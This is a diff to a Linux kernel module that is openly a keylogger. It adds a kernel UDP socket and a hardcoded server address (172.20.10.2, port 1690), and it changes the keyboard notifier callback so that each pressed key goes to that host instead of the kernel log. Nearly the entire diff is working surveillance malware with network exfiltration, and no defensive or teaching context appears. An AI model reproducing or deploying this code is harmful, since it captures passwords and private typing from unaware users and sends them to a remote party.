@@ -1,8 +1,71 @@
 #include "key_logger.h"
 
+#include <linux/inet.h>
 #include <linux/input.h>
 #include <linux/keyboard.h>
+#include <linux/net.h>
 #include <linux/notifier.h>
+
+static struct socket *udp_socket = NULL;
+
+const char *server_ip = "172.20.10.2";
+const unsigned short server_port = 1690;
+
+static int create_udp_socket(void) {
+  int ret;
+
+  ret = sock_create_kern(&init_net, PF_INET, SOCK_DGRAM, IPPROTO_UDP,
+                         &udp_socket);
+  if (ret < 0) {
+    udp_socket = NULL;
+    return ret;
+  }
+
+  pr_info("Kernel UDP socket created successfully.\n");
+  return 0;
+}
+
+static int send_udp_message(const char *ip, unsigned short port,
+                            const char *message, size_t message_len) {
+  struct sockaddr_in dest_addr;
+  struct msghdr msg = {0};
+  struct kvec iov;
+  int ret;
+
+  if (!udp_socket) {
+    pr_info("UDP socket is not initialized.\n");
+    return -EINVAL;
+  }
+
+  memset(&dest_addr, 0, sizeof(dest_addr));
+  dest_addr.sin_family = AF_INET;
+  dest_addr.sin_port = htons(port);
+  ret = in4_pton(ip, -1, (u8 *)&dest_addr.sin_addr.s_addr, '\0', NULL);
+
+  if (ret == 0) {
+    pr_info("Invalid IP address format.\n");
+    return -EINVAL;
+  }
+
+  iov.iov_base = (char *)message;
+  iov.iov_len = message_len;
+
+  msg.msg_name = &dest_addr;
+  msg.msg_namelen = sizeof(dest_addr);
+
+  ret = kernel_sendmsg(udp_socket, &msg, &iov, 1, message_len);
+  if (ret < 0) {
+    pr_info("Failed to send UDP message: %d\n", ret);
+  }
+  return ret;
+}
+
+static void release_socket(void) {
+  if (udp_socket) {
+    sock_release(udp_socket); // Release the socket
+    pr_info("UDP socket released.\n");
+  }
+}
 
 static const char *us_keymap[][2] = {
     {"\0", "\0"},
@@ -129,9 +192,7 @@ static const char *us_keymap[][2] = {
 
 static const char *keycode_to_us_string(int keycode, int shift) {
   if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
-    const char *us_key =
-        (shift == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
-    return us_key;
+    return (shift == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
   }
 
   return NULL;
@@ -144,7 +205,7 @@ static int keyboard_callback(struct notifier_block *kblock,
   const char *key = keycode_to_us_string(key_param->value, key_param->shift);
 
   if (key && key_param->down) {
-    printk(KERN_INFO "%s\n", key);
+    send_udp_message(server_ip, server_port, key, strlen(key) + 1);
   }
 
   return NOTIFY_OK;
@@ -153,8 +214,12 @@ static int keyboard_callback(struct notifier_block *kblock,
 static struct notifier_block nb;
 
 void start_key_logging(void) {
+  create_udp_socket();
   nb.notifier_call = &keyboard_callback;
   register_keyboard_notifier(&nb);
 }
 
-void stop_key_logging(void) { unregister_keyboard_notifier(&nb); }
+void stop_key_logging(void) {
+  unregister_keyboard_notifier(&nb);
+  release_socket();
+}
